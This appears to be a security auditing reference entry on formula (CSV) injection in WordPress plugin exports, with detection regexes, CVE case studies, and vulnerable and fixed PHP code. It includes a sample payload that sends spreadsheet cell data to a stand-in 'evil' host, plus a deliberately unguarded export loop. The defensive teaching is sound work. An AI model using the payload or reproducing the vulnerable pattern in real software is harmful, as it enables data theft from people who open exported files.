---
class_id: WP-CSVINJ
title: Formula (CSV) Injection in exported data
cwe: [CWE-1236]
owasp: A03:2021-Injection
severity_typical: high
auth_required_typical: unauthenticated
prevalence_rank: 25
detection:
  - id: CSVINJ-001
    description: Any fputcsv() call — the exhaustive worklist of CSV emit sites
    regex: '\bfputcsv\s*\('
    confidence: low
    false_positive_notes: >-
      Matches correct code by design; the point is completeness. Plugins have few CSV emit
      sites, so reading every hit is cheap. For each one ask: does any field originate from
      a request, a form submission, a comment, a username, or a search query, and is each
      field neutralised before it is written? A field that only ever holds an integer, a
      timestamp, or a value the plugin generated itself is not a finding.
  - id: CSVINJ-002
    description: A whole row variable written straight to fputcsv() with no per-field neutralisation
    regex: '\bfputcsv\s*\(\s*\$[A-Za-z_][A-Za-z0-9_]*\s*,\s*\$[A-Za-z_][A-Za-z0-9_]*\s*\)'
    confidence: medium
    false_positive_notes: >-
      This is the exact shape of CVE-2024-3214: `fputcsv( $df, $row )`
      inside a foreach over rows read back from the database. It is safe only if the fields
      were neutralised earlier — commonly by an array_map() a few lines above, or at write
      time before storage. Read upward for that. Neutralising at write time is a legitimate
      strategy but a fragile one: it protects only rows written after the fix shipped, so
      check whether existing stored rows were backfilled.
  - id: CSVINJ-003
    description: A CSV download endpoint — Content-Disposition attachment with a .csv filename
    regex: 'Content-Disposition[^\n]*attachment[^\n]*\.csv'
    confidence: low
    false_positive_notes: >-
      Fires on every CSV export, correct or not. Its value is locating the export endpoints
      so the two questions can be asked: who may call this (an unauthenticated export is
      how the highest-scoring CVEs in this class arise), and is each field neutralised. Pair
      each hit with the nearest capability and nonce check.
  - id: CSVINJ-004
    description: Hand-rolled CSV assembled by joining fields with commas, bypassing fputcsv() entirely
    regex: 'implode\s*\(\s*[''"],[''"]\s*,'
    confidence: low
    false_positive_notes: >-
      Comma-joining is ubiquitous in PHP for building SQL fragments, class attributes and
      display strings, so most hits are unrelated. It is a finding only when the result is
      written to a file or an attachment response. Confirm by looking for a nearby
      Content-Disposition header or a file write. Hand-rolled CSV also usually gets quoting
      wrong independently of formula injection.
  - id: CSVINJ-005
    description: Incomplete formula-character guard — checks some of = + - @ but not all of them
    regex: 'in_array\s*\(\s*substr\s*\([^)]*\)\s*,\s*array\s*\(\s*[''"][=+@-][''"]\s*\)'
    confidence: high
    false_positive_notes: >-
      Matches a guard whose denylist holds exactly ONE formula character. The complete set
      Excel, LibreOffice and Google Sheets treat as formula starters is = + - @, plus tab
      and carriage return, which are handled separately. A guard that stops `=` and lets
      `+` through stops nothing: `+1+1` and `@SUM(1+1)` both execute. The complete
      five-element form used in the CVE-2024-3214 patch does not match this rule.
fix_apis:
  - "Prefix the field with a single quote or a space when it begins with = + - @"
  - "str_replace() to strip tab and carriage return from exported fields"
  - sanitize_text_field()
  - current_user_can()
  - check_admin_referer()
examples:
  - cve: CVE-2024-3214
    severity: 9.8
    auth: unauthenticated
    root_cause: >-
      The search-log export wrote database rows straight out with `fputcsv( $df, $row )`
      inside a foreach, with no neutralisation of any field. The logged search query is
      attacker-supplied and unauthenticated — anyone could run a search containing a
      formula and wait for an administrator to export the log. The 4.22.2 patch adds the
      guard immediately before the write: if the first character of the logged query is one of
      = - " @ +, prefix a space and strip tabs.
    code_ref: https://plugins.trac.wordpress.org/browser/relevanssi/tags/4.22.1/lib/log.php#L340
    source_url: https://nvd.nist.gov/vuln/detail/CVE-2024-3214
  - cve: CVE-2023-5424
    severity: 8.8
    auth: unauthenticated
    root_cause: >-
      Form submissions were exported to CSV without neutralising leading formula
      characters. The submitting user is unauthenticated, so the payload enters through an
      ordinary public form field and executes when staff open the export.
    code_ref: https://plugins.trac.wordpress.org/browser/ws-form/trunk/
    source_url: https://nvd.nist.gov/vuln/detail/CVE-2023-5424
  - cve: CVE-2023-5527
    severity: 8.0
    auth: subscriber+
    root_cause: >-
      Directory listing fields submitted by a low-privileged user were written to the CSV
      export unneutralised, so a Subscriber could plant a formula that ran on the
      administrator's machine at export time.
    code_ref: https://plugins.trac.wordpress.org/browser/business-directory-plugin/trunk/includes/admin/
    source_url: https://nvd.nist.gov/vuln/detail/CVE-2023-5527
  - cve: CVE-2025-58855
    severity: 7.1
    auth: unauthenticated
    root_cause: >-
      Logged submission data was exported without formula neutralisation. The log is
      populated by unauthenticated visitors, making the export the delivery mechanism.
    source_url: https://nvd.nist.gov/vuln/detail/CVE-2025-58855
  - cve: CVE-2025-6838
    severity: 4.1
    auth: contributor+
    root_cause: >-
      Link data recorded from Contributor-authored content reached the CSV export
      unneutralised. Lower CVSS than the unauthenticated cases because the attacker needs a
      posting account, but the mechanism is identical.
    source_url: https://nvd.nist.gov/vuln/detail/CVE-2025-6838
  - cve: CVE-2025-13133
    severity: 6.6
    auth: admin+
    root_cause: >-
      The user import/export round trip wrote stored user fields to CSV without
      neutralisation. Included as the contrast case: the export itself is Admin-only, so
      the risk is not privilege escalation on this site but the exported file being opened
      elsewhere — the payload travels with the document.
    source_url: https://nvd.nist.gov/vuln/detail/CVE-2025-13133
---

# WP-CSVINJ — Formula (CSV) Injection in exported data

## What it is

A spreadsheet application treats a cell beginning with `=`, `+`, `-` or `@` as a formula,
not as text. If a plugin exports user-supplied data to CSV without neutralising those
leading characters, an attacker who can get a string into the exported table controls a
formula that runs on the machine of whoever opens the file — typically an administrator,
on their desktop, outside the site's security boundary entirely.

The payload is not executed by WordPress. Nothing in the site is compromised at export
time, which is why this class is easy to dismiss and easy to miss. The victim is the person
who opens the download.

Modern Excel warns before executing DDE, and the practical impact varies by application and
configuration. Do not overstate a finding as guaranteed remote code execution; state it as
formula execution in the recipient's spreadsheet, which can exfiltrate cell contents over
a crafted hyperlink even when command execution is blocked.

## Why it happens in WordPress

Two properties of WordPress make this class recur:

**The data arrives long before it leaves.** A search query, a form submission, a comment
author name, a directory listing field — all are stored by one part of the plugin and
exported by another, often written months apart. The export code sees rows from
`$wpdb->get_results()` and treats them as trusted internal data, because by then they look
like internal data.

**Escaping habits target HTML.** A field that was correctly `sanitize_text_field()`'d on
input and `esc_html()`'d on screen is still dangerous in a CSV, because neither function
touches a leading `=`. `esc_html()` is the reflex, and it is the wrong tool here — this is
a different output context with a different grammar, and WordPress ships no helper for it.

The highest-severity cases in the corpus share a shape: the data is submitted by an
**unauthenticated** visitor (a search, a public form) and exported by an **administrator**.
The attacker needs no account, and the victim is the highest-privileged user on the site.

## Vulnerable pattern

```php
// Export the search log. Every field goes out exactly as stored.
$data = $wpdb->get_results( "SELECT query, hits, time FROM {$wpdb->prefix}search_log", ARRAY_A );

header( 'Content-Type: text/csv' );
header( 'Content-Disposition: attachment; filename=search-log.csv' );

$df = fopen( 'php://output', 'w' );
fputcsv( $df, array_keys( reset( $data ) ) );
foreach ( $data as $row ) {
    fputcsv( $df, $row );        // <- CVE-2024-3214 is exactly this line
}
fclose( $df );
```

An unauthenticated visitor searches for `=IMPORTXML("http://evil/"&A1,"//a")`. It is stored
verbatim, and executes when an administrator opens the export.

An incomplete guard is the other half of this class:

```php
// Stops '=' and nothing else. `+1+1` and `@SUM(...)` still execute.
if ( in_array( substr( $value, 0, 1 ), array( '=' ), true ) ) {
    $value = "'" . $value;
}
```

## Secure pattern

Neutralise at **write time**, per field, immediately before the row is emitted:

```php
/**
 * Neutralise a field for CSV output.
 *
 * Prefixing with a single quote makes spreadsheet applications treat the cell as
 * literal text. Tab and carriage return are stripped because they also begin a
 * formula context in some applications.
 */
function wps_csv_field( $value ) {
    $value = (string) $value;
    if ( '' !== $value && in_array( $value[0], array( '=', '+', '-', '@' ), true ) ) {
        $value = "'" . $value;
    }
    return str_replace( array( "\t", "\r" ), '', $value );
}

$df = fopen( 'php://output', 'w' );
foreach ( $data as $row ) {
    fputcsv( $df, array_map( 'wps_csv_field', $row ) );
}
fclose( $df );
```

Guard the endpoint as well — an export usually returns everyone's data:

```php
if ( ! current_user_can( 'export' ) ) {
    wp_die( esc_html__( 'Denied', 'td' ) );
}
check_admin_referer( 'wps_export_log' );
```

Escape at output, not at input. Neutralising before storage protects only rows written
after the fix ships, and leaves every existing row armed.

## Real-world case studies

The search-log export in CVE-2024-3214 (CVSS 9.8) is the cleanest example in the
class, because the vulnerable and patched sources differ by one guard. Before the fix, the
export loop was `foreach ( $data as $row ) { fputcsv( $df, $row ); }`. The patch inserts,
immediately before the write, a check on the first character of the logged query against
`array( '=', '-', '"', '@', '+' )`, prefixing a space and stripping tabs when it matches.
The search query is unauthenticated input and the exporter is an administrator, which is
what produces the 9.8.

CVE-2023-5424 (8.8) and CVE-2025-58855 (7.1) are the same mechanism through public form
and honeypot logs. CVE-2023-5527 (8.0) lowers the bar only to Subscriber, through directory
listing fields.

CVE-2025-13133 (6.6) is the useful contrast: the export is Admin-only, so there is no
privilege escalation on the site at all. It still scores, because the exported file leaves
the site — the payload travels with the document and executes wherever it is opened.

## Detection guidance

Absence of a guard is not greppable, so this class is worklist-shaped like WP-IDOR. Work it
in this order:

1. `CSVINJ-003` locates the export endpoints. For each, record who may call it.
2. `CSVINJ-001` locates every emit site. Plugins have few; read them all.
3. `CSVINJ-002` narrows to the raw-row shape that has produced the real CVEs.
4. `CSVINJ-005` is the one high-confidence rule: a partial denylist is unambiguously wrong.

The question that resolves a hit is always the same: for each field in the row, can any
value in it originate from a request? Trace one level back from the query, not just the
export function.

## Audit checklist

- [ ] Every `fputcsv()` field passes through a neutralising function, applied at write time.
- [ ] The denylist is the complete set `= + - @`, not a subset.
- [ ] Tab and carriage return are stripped.
- [ ] The export endpoint checks a capability and a nonce.
- [ ] Fields sourced from unauthenticated input (searches, public forms, comments) are
      identified explicitly — these are the high-severity paths.
- [ ] If neutralisation was added at input time, existing stored rows were backfilled.
- [ ] Hand-rolled CSV built with `implode( ',', ... )` is replaced by `fputcsv()`, which at
      least gets quoting right.
